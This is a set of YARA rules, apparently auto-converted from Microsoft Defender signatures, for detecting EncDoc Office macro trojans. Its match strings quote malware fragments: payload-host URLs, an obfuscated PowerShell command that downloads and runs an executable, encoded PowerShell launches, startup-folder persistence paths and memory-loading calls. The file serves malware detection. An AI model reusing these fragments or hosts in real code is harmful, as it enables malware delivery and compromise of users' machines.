rule Trojan_O97M_EncDoc_SBR_2147759893_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.SBR!MSR"
        threat_id = "2147759893"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://bluesteelenergy.com/derton/energy.php" ascii //weight: 1
        $x_1_2 = "https://drmariepappas.com/drpepper/coladas.php" ascii //weight: 1
        $x_1_3 = "https://woodenrestorations.com/gernaer/woodles.php" ascii //weight: 1
        $x_1_4 = "zipfldr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Trojan_O97M_EncDoc_RA_2147770392_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RA!MTB"
        threat_id = "2147770392"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"WSCript.shell\"" ascii //weight: 1
        $x_1_2 = {53 65 74 20 [0-47] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-31] 29 0d 0a [0-10] 3d 20 00 2e 52 75 6e 28 [0-15] 2c 20 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "kui = Chr(fscv - 121)" ascii //weight: 1
        $x_1_4 = "kui(220) & kui(198) & kui(189) & kui(153) & kui(168) & kui(220)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RA_2147770392_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RA!MTB"
        threat_id = "2147770392"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 6f 72 20 69 20 3d 20 31 20 54 6f 20 [0-5] 0d 0a [0-15] 20 3d 20 4c 65 66 74 28 [0-15] 2c 20 69 29 0d 0a 49 66 20 4c 65 6e 28 [0-15] 29 20 3e 20 31 20 54 68 65 6e 0d 0a 20 20 20 [0-15] 20 3d 20 52 69 67 68 74 28 [0-15] 2c 20 31 29 20 26 20 [0-15] 0d 0a [0-31] 3d 20 [0-15] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_2 = " = \"new:F935DC22\" + \"-1CF0-11D\" + \"0-ADB9-00C\" + \"04FD58A0B\"" ascii //weight: 1
        $x_1_3 = {20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-10] 28 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RH_2147771198_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RH!MTB"
        threat_id = "2147771198"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "dne!0d!qpxfstifmm!)ofx.pckfdu!Tztufn/Ofu/XfcDmjfou*/EpxompbeGjmf)(iuuq;00ftrvjofsptbhvjmbsmfsnb/dpn0y0ifbwz/fyf(-%fow;BqqEbub,(]OtDLB/fyf(*<)Ofx.Pckfdu!.dpn!Tifmm/Bqqmjdbujpo*/TifmmFyfdvuf)%fow;BqqEbub,(]OtDLB/fyf(*" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 28 [0-95] 28 [0-95] 2c 20 22 31 32 22 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RED_2147771310_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RED!MTB"
        threat_id = "2147771310"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"explorer.exe c:\\programdata\\bufBorderPointer.hta\"" ascii //weight: 1
        $x_1_2 = {53 65 74 20 [0-15] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 0d 0a 00 2e 65 78 65 63 20 70 28 67 65 74 77 63 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_R_2147775869_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.R!MTB"
        threat_id = "2147775869"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 20 3d 20 48 65 61 70 43 72 65 61 74 65 28 34 30 30 30 31 2c 20 55 42 6f 75 6e 64 28 [0-10] 29 2c 20 55 42 6f 75 6e 64 28 00 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Xjpm = HeapAlloc(h, 9, UBound(Poiczy))" ascii //weight: 1
        $x_1_3 = "Ctbl = RtlMoveMemory(Xjpm + Vymnxssy, Tjprz, 1)" ascii //weight: 1
        $x_1_4 = "Sub AUtO_CLoSe()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RR_2147778405_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RR!MTB"
        threat_id = "2147778405"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 61 70 70 64 61 74 61 22 29 [0-15] 3d 00 26 22 5c 6d 69 63 72 6f 73 6f 66 74 5c 77 69 6e 64 6f 77 73 5c 73 74 61 72 74 6d 65 6e 75 5c 70 72 6f 67 72 61 6d 73 5c 73 74 61 72 74 75 70 5c 6b 65 66 65 2e 62 61 74 22 [0-5] 3d 22 71 67 76 6a 61 67 38 67 62 32 7a 6d 64 71 70 7a 78 6d 6e 6f 78 6e 72 65 79 76 35 7a 78 6d 74 65 63 79 61 76 79 33 6a 6c 79}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RK_2147795394_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RK!MTB"
        threat_id = "2147795394"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"cm\" + String(1, \"d\") & Space(1) + \"/c \" + \"\"" ascii //weight: 1
        $x_1_2 = "= StrConv(\"a\", vbUpperCase) + Space(1)" ascii //weight: 1
        $x_1_3 = "= Replace(\"s\", \"s\", \"m\")" ascii //weight: 1
        $x_1_4 = "= Split(LString, \".\")" ascii //weight: 1
        $x_1_5 = "= \"\\edfa3asdh\" & MyPos & String(3, \"q\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RK_2147795394_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RK!MTB"
        threat_id = "2147795394"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" + enc" ascii //weight: 1
        $x_1_2 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_3 = "6AEEAUABQAEQAQQBUAEEAXAAkAFAAcgBvAGMATgBhAG0AZQAiACkA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RPM_2147816716_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RPM!MTB"
        threat_id = "2147816716"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=strreverse(\"txt.cne/88/54.101.231.83//:ptth\")" ascii //weight: 1
        $x_1_2 = "Replace(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RPM_2147816716_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RPM!MTB"
        threat_id = "2147816716"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(80)+range(\"c6\").notetextmsjz2=\"\"+eeeewmsjz3=msjz1&msjz2klsad().execmsjz3endfunctionfunctionklsad()asobjectsetklsad=getobject(range(\"c7\").notetext)endfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RPA_2147816876_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RPA!MTB"
        threat_id = "2147816876"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".OpenTextFile(YSDs + \"\\GGSQi.vbs\", 8, True)" ascii //weight: 1
        $x_1_2 = "= GetTickCount + (Finish * 1000)" ascii //weight: 1
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-10] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_EncDoc_RP_2147898955_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/EncDoc.RP!MTB"
        threat_id = "2147898955"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "regsvr32.exe" ascii //weight: 1
        $x_1_2 = "SysWow64\\" ascii //weight: 1
        $x_1_3 = "\\Windows\\" ascii //weight: 1
        $x_1_4 = "\"7777\"" ascii //weight: 1
        $x_1_5 = "RETURN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

